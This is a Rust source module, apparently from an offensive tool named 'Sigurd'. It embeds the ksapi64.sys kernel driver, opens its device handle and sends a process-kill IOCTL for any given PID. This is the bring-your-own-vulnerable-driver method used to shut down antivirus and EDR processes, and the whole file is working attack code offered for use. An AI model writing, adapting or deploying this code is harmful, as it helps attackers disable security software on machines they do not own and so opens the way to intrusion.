use std::{mem, ptr::null_mut};

use winapi::{
    ctypes::c_void, 
    shared::minwindef::{DWORD, LPVOID}, 
    um::{
        ioapiset::DeviceIoControl,
        winsvc::SERVICE_ALL_ACCESS,
        fileapi::{CreateFileW, OPEN_EXISTING}, 
        handleapi::{CloseHandle, INVALID_HANDLE_VALUE}
    }
};

use crate::{
    trace,
    drivers::KillerDriver,  
    utils::{error::SigurdError, to_wstring}
};

const DRIVER_NAME: &str = "ksapi64";
const VERSION: &str = "0.0.1";

const DRIVER_DEVICE: &str = "\\\\.\\ksapi64_dev";
const IOCTL_KILL: u32 = 2237504;

static DRIVER: &'static [u8] = include_bytes!("../../../drivers/ksapi64.sys");

pub struct KsApi64 {
    device: *mut c_void
}

#[repr(C, packed)]
struct payload {
    pid: DWORD, 
}

impl payload {
    fn new(pid: DWORD) -> Self {
        Self { pid }
    }
}

impl KsApi64 {}

impl KillerDriver for KsApi64 {
    fn new() -> Result<Box<dyn KillerDriver>, SigurdError> where Self: Sized + 'static {
        return Ok(Box::new(Self { device: 0 as *mut c_void }));
    }

    fn init(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            let handle = CreateFileW(
                to_wstring(DRIVER_DEVICE).as_ptr(), 
                SERVICE_ALL_ACCESS, 
                0,
                null_mut(), 
                OPEN_EXISTING, 
                0, 
                null_mut(),
            );

            if handle == INVALID_HANDLE_VALUE { 
                return Err(SigurdError::last("Can't get dervice handle"));
            } else {
                trace!("Got device handle");
                self.device = handle;
                return Ok(true);
            }
        }
    }

    fn destruct(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            match CloseHandle(self.device) {
                0 => {
                    return Err(SigurdError::last("Can't close device handle"));
                }
                _ => {
                    trace!("Closed device handle");
                    return Ok(true);
                }
            }
        }
    }

    fn name(&self) -> &'static str {
        return DRIVER_NAME;
    }

    fn version(&self) -> &'static str {
        return VERSION;
    }

    fn description(&self) -> &'static str {
        return "KSApi64";
    }

    fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
        let v = DRIVER.to_vec();
        return Ok(v);
    }

    fn kill(&mut self, pid: u32) -> Result<(), crate::utils::error::SigurdError> {
        unsafe {    
            let mut input = payload::new(pid);

            let mut out = 0u32;
            let mut bytes = 0u32;
            let success = DeviceIoControl(
                self.device, 
                IOCTL_KILL, 
                &mut input as *mut _ as LPVOID, 
                mem::size_of::<payload>() as DWORD, 
                &mut out as *mut _ as *mut _, 
                4, 
                &mut bytes, 
                null_mut(),
            );
            
            if success != 0 {
                trace!("IOCTRL request send {}", IOCTL_KILL);
                return Ok(());
            } else {
                return Err(SigurdError::last("Failed to kill the process"));
            }
        }
    }
}
